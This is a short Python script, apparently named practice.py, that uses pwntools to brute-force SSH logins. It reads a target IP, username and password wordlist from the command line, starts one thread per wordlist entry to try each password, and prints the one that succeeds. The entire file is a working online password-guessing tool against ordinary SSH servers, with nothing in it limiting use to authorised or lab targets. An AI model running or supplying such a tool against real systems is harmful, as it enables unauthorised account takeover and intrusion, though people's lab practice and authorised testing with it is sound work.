from pwn import *
import sys
import os
from threading import Thread, Lock

ip = username = wordlist = None
port = 22
found = False
lock = Lock()

# Parse arguments
for arg in sys.argv[1:]:
    if arg.startswith("ip="):
        ip = arg.split("=")[1]
    elif arg.startswith("username="):
        username = arg.split("=")[1]
    elif arg.startswith("wordlist="):
        wordlist = arg.split("=")[1]
    elif arg.startswith("port="):
        port = int(arg.split("=")[1])
    else:
        print(f"[!] Unknown argument: {arg}")

if not ip or not username or not wordlist:
    print("Usage: python practice.py ip=<IP> username=<USERNAME> wordlist=<FILE> [port=<PORT>]")
    sys.exit()

if not os.path.exists(wordlist):
    print(f"[!] File not found: {wordlist}")
    sys.exit()

def try_password(password):
    global found
    if found:
        return
    try:
        s = ssh(
            user=username,
            password=password.strip(),
            host=ip,
            port=port,
            ssh_agent=False,
            ignore_config=True,
            auth_none=True,
            timeout=3
        )
        if s.connected():
            with lock:
                if not found:
                    found = True
                    print(f"\n✅ Correct password is: \033[92m{password.strip()}\033[0m")
    except:
        with lock:
            print(f"[-] Tried: {password.strip()}")

# Start threads
with open(wordlist, 'rt') as f:
    for word in f:
        if found:
            break
        Thread(target=try_password, args=(word,)).start()
